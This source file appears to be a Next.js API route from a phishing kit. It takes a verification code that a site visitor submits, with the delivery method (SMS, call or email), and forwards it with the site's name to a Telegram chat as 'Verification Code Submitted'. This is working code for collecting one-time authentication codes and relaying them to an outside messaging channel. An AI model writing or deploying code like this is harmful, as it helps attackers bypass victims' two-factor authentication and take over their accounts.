import { NextResponse } from 'next/server';
import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';

const METHOD_LABELS = {
  text: 'Text Message (SMS)',
  call: 'Phone Call',
  email: 'Email',
};

function escapeHtml(s) {
  if (typeof s !== 'string') return '';
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

export async function POST(request) {
  try {
    const body = await request.json().catch(() => ({}));
    const method = String(body.method ?? 'text').toLowerCase();
    const code = escapeHtml(String(body.code ?? '').trim()) || '—';
    const label = METHOD_LABELS[method] || method || 'Unknown';

    const message = [
      `🏷 Site: ${escapeHtml(getSiteName())}`,
      '',
      '🔑 <b>Verification Code Submitted</b>',
      `🔢 Code: ${code}`,
    ].join('\n');

    await sendTelegramMessage(wrapFlowMessage(message));
    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('notify-verify-code:', err);
    return NextResponse.json({ error: 'Notification failed' }, { status: 503 });
  }
}
